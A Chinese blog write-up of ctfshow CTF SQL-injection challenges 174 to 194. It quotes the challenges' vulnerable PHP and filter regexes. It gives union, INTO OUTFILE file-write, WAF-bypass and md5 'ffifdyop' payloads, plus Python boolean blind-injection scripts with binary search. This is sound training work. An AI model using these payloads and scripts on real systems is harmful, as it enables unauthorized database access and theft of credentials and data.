---
title: 'ctfshow刷题,9-3'
date: '2024-9-3 17:28'
description: 常规注入类,盲注类
abbrlink: 6069c950
---

```Introduction
又来刷题了
ctfshow的题目还是很全的,之前刷题都不是很系统,这次再努力一次吧!
参考:https://hextuff.dev/2021/07/29/ctfshow-web-getting-started-sql-injection/#web188
```

> ### 刷题


> **web 174(sql注入)**

查询语句

```sql
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
```

结果返回逻辑

```php
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

尝试

```sql
-1 'union select 1,1--+ #这个是不能直接查询,过不了正则,即查询的结果不能含有flag和数字,那这样即使是查到flag也无法输出结果,因此我们要进行base64编码


1' union select CHAR(100),CHAR(100)--+
```

sqlmap给出

```sql
http://994c4e0c-b284-461e-9612-c6ef5eaa512a.challenge.ctf.show/api/v4.php?id=1' UNION ALL SELECT NULL,CONCAT(0x7178717671,0x6c734e546e4571636d5443754641574f41426d6b43644745744a6976654149746f76647059774676,0x7171707071)-- -&page=1&limit=10
```

手动注入:

```sql
# 当前数据库表名
0' union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() --+

# 直接查flag
0' union Select 1,2,group_concat(password) from ctfshow_user where username = 'flag' --+

```

![image-20240904085215228](https://gitee.com/eviden/img/raw/master/202409040852358.png)

> **175(sql注入全过滤)**

- 时间盲注写脚本

- 将结果以文件形式输出(当存在可写入权限时是一种通杀方法)

  ```sql
   0' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt'--+
  ```


> **181**

```sql
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
 
 解题:
 'or'1'='1'--%0c #万能密码,闭合永真式查出所有数据
 'or(username)='flag #类似上面思路,不过闭合后得到username=flag
 -1'%0cor%0cusername%0clike%0c'flag #like关键字的使用,若=号被过滤
```



> **182**,过滤flag关键字

```sql
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
  }
  
  
  解题
  1.万能密码 'or'1'='1'--%0c 或者 1'or'1'--%01 #注意闭合方式和手法
  2.like模糊查询绕过flag 'or`username`like'f%  或者 999'||`username`like'f%
  3.concat拼接绕过flag  -1'or(username=concat('fl','ag'))and'a'='a
  
  
```

`tips`:这里给出万能密码拼接出的sql语句.方便分析

```sql
select id,username,password from ctfshow_user where username !='flag' and id = '-1'or(username=concat('fl','ag'))and'a'='a' limit 1;
```

**从左往右看的话就好理解了,前面两个and可以看作一个,因为默认顺序,然后or后面的and都是永真,因此整个where判断条件都是永真!即可查询所有密码**

> **183** ,or  and flag 关键字都被过滤

```php
//拼接sql语句查找指定ID用户
  $sql = "select count(pass) from ".$_POST['tableName'].";";

//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  }


//返回用户表的记录总数
      $user_count = 0;
      
```

> **184** right join on 右连接构造判断表达式

```python
import requests
# 注意不要用https://
url = "http://29eaa11f-1ab7-4b93-9fb7-bd2b43e3daba.challenge.ctf.show/select-waf.php"

flag = 'ctfshow{'
for i in range(45):
    if i <= 8:
        continue
    for  j in range(127):
        data = {
            "tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({j})))"
        }
        # right join 
        r = requests.post(url,data=data)
        if r.text.find("$user_count = 43;")>0:
            if chr(j) != ".":
                print(data)
                flag += chr(j)
                print(flag.lower())
                if chr(j) == "}":
                    flag += chr(j)
                    exit(0)
                break
print(flag.lower()+'}')

```

> **185** 过滤数字,下面是数字构造表

![在这里插入图片描述](https://gitee.com/eviden/img/raw/master/202409051538851.png)



> **187** [SQL绕过]md5($str,true)类型绕过,md5万能密码

```php
//拼接sql语句查找指定ID用户
  $sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";

//返回逻辑
$username = $_POST['username'];
$password = md5($_POST['password'],true);

//只有admin可以获得flag
if($username!='admin'){
    $ret['msg']='用户名不存在';
    die(json_encode($ret));
}

//万能密码 ffifdyop  129581926211651571912466741651878684928
//测试
<?php
echo md5("ffifdyop",true);
```

> **188**    关于mysql 一个神奇的整数强制转换和查询

```php
 //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username}";
 //用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
else{
    die('密码错误!')
}

//思路:
//首先username肯定通过sql查不出东西的,因为只判断行数
//当查到的行数等于密码的整形值时,就会返回flag
//因为一般的查询行数我们不可知,那么我们可以考虑是否能查出0行的数据来
于是想着将 select xxx where 0
   即将后面的查询条件控制为假
```

> **191** 过滤ascii关键字,其实也可以二分注!(利用if条件注入即可)

```php
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }

```

```sql
先看if怎么用
if(substr((select f1ag from ctfshow_fl0g),2,1)>'a',1,0) #给出注入语句
if(<condition>, 1, 0) #总结就是 第一个条件成立返回true,不成立返回false
condition:-->substr((select f1ag from ctfshow_fl0g),2,1)>'a'
substr取出子串1位用于与后面的>进行判断

或者ord 
0'or(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),{},1))>{})='1
```

![image-20240906234842332](https://gitee.com/eviden/img/raw/master/202409062348508.png)

> **193** 盲注过滤substr

```php
  
//拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = '{$username}'";
//密码检测

  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii|ord|hex|substr/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }

```

**这里采用right,或者left关键字**

bool判断的时候要对整个字符子串进行匹配,思路就是判断一个字符就把它加到目标字符串上去

即被对比的字符串为`flag+'chr(mid)'`

> **194** left、right、substring、char都不能用了。

```sql
这里使用 lpad() 函数
它和left()的注入语句类似，只是多了一个填充字符串padstr参数，令其为空即可。
admin'and ((lpad((select f1ag from ctfshow_flxg),1,'')>'a'))#

# 或者使用mid()函数
0' or if(mid((select f1ag from ctfshow_flxg),{},1)>'{}',1,0) -- 
```

![在这里插入图片描述](https://gitee.com/eviden/img/raw/master/202409072234190.png)

![image-20240908093401477](https://gitee.com/eviden/img/raw/master/202409080934597.png)


> ### **盲注大法它leile~**

```python
import requests

url='http://90a1c915-af7d-4bb9-8069-f2da501eb8f9.challenge.ctf.show/api/index.php'
proxy={
    'http': '127.0.0.1:8000',
    'https': '127.0.0.1:8000'
}
# payload = "0'or(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),{},1))>{})='1"
# 如需查询多个字段,则利用列表生成式生成批量sql语句
def product_muti_sql(begin,end):
    # 这里给出默认的查所有表名的sql语句生成示例,若需要其他方式自行修改
    return [f"select table_name from information_schema.tables where table_schema=database() limit {j},1" for j in range(begin, end+1)]


def right_boolinjection(method,sql,vulstring):
    flag=''
    for i in range(0,200):
    # for asc in range(32,127):
        left=32
        right=127
        mid=0
        while left<right:
            mid=(left+right)//2
            # sql=f"1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {j},1),{i},1))>{mid}--+"
            # select table_name from information_schema.tables where table_schema=database() limit {j},1
            # payload=f"1'and ascii(substr(({sql}),{i},1))>{mid}--+"
            # payload=f"0'or(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1))>{mid})='1"
            # payload=f"0'or if(substr((select f1ag from ctfshow_fl0g),{i},1)>'{chr(mid)}',1,0)='1"
            payload=sql.format(i,flag+chr(mid))
            # 区分发包方法
            if method=='GET':
                re=requests.get(url+'?id='+payload)
            else:
                re=requests.post(url,data={'username':payload,"password" : 0,},proxies=proxy)
            # 二分法,看不懂的手动模拟一下咯!
            # 判断标志字符串是否在返回包中
            # if 'You are in..........' in re.text:
            # 后续考虑采用页面相似度算法进行判断,再次佩服sqlmap的作者!
            if vulstring in re.json()['msg']:
                left=mid+1
            else:
                right=mid
            print(chr(left))
        # 二分最后搜到左边的值返回,检查是否为空,为空则说明字段查询完毕且找不到字符对应查询终止!
        if chr(left)!=' ':
            # print(chr(left),end='')
            flag+=chr(left).lower()
            print(flag.lower())
        # else:
        #     break
    flag+='\n'
    return flag      
# 注入点,将要验证的sql语句注入到payload中,支持多字段查询!
def run_boolinjection(method,sql,vulstring):
    flag=''
    for i in range(0,200):
    # for asc in range(32,127):
        left=32
        right=127
        mid=0
        while left<right:
            mid=(left+right)//2
            # sql=f"1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {j},1),{i},1))>{mid}--+"
            # select table_name from information_schema.tables where table_schema=database() limit {j},1
            # payload=f"1'and ascii(substr(({sql}),{i},1))>{mid}--+"
            # payload=f"0'or(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1))>{mid})='1"
            # payload=f"0'or if(substr((select f1ag from ctfshow_fl0g),{i},1)>'{chr(mid)}',1,0)='1"
            payload=sql.format(i,chr(mid))
            # 区分发包方法
            if method=='GET':
                re=requests.get(url+'?id='+payload)
            else:
                re=requests.post(url,data={'username':payload,"password" : 0,},proxies=proxy)
            # 二分法,看不懂的手动模拟一下咯!
            # 判断标志字符串是否在返回包中
            # if 'You are in..........' in re.text:
            # 后续考虑采用页面相似度算法进行判断,再次佩服sqlmap的作者!
            if vulstring in re.json()['msg']:
                left=mid+1
            else:
                right=mid
            print(chr(left))
        # 二分最后搜到左边的值返回,检查是否为空,为空则说明字段查询完毕且找不到字符对应查询终止!
        if ' '<=chr(left)<='~':
            # print(chr(left),end='')
            flag+=chr(left)
            print(flag.lower())
        # else:
        #     break
    flag+='\n'
    return flag      
    # print()
    # 重试次数,包括查询到或者没查询到的所有次数.防止发包过多!
# for sql in product_muti_sql(begin=0,end=5):
#     print(run_boolinjection('GET',sql=sql))
print(right_boolinjection('POST',"admin'and ((lpad((select f1ag from ctfshow_flxg),{},'')>'{}'))#",'密码错误'))
# 最后给出一些常用的查询默认语句(无waf绕过,最纯真的模式!)
'''
tips: 一般 limit 3,1 前面这个3是控制位置的,作为可变参数插入到注入模块中!
以下所有打{}的变量表示可控
查指定数据库的所有表名
select table_name from information_schema.tables where table_schema="security" limit {3},1
查所有的字段名称
select column_name from information_schema.columns where table_name='users' limit {1},1
直接查数据
select username from users limit {0},1
'''
        
```



## **TODO**

- [✅] 完成盲注类型脚本编写,最好带二分法,因为快!

- [✅] 再次通过sqli-labs靶场锻炼自己的脚本编写能力

- [✅] 用go实现上述脚本

- 学习堆叠注入绕过tricks,ctfshow

- 实现一般图形化界面完成盲注(这感觉要仔细思考思考!)

  

> ### **至此盲注就结束啦!**

---

**bypass汇总:**

```sql
|| 字符串拼接符合,相当于or的作用
SELECT 1 OR 0;  -- 结果为 1
SELECT 1 || 0;  -- 结果为 1
```

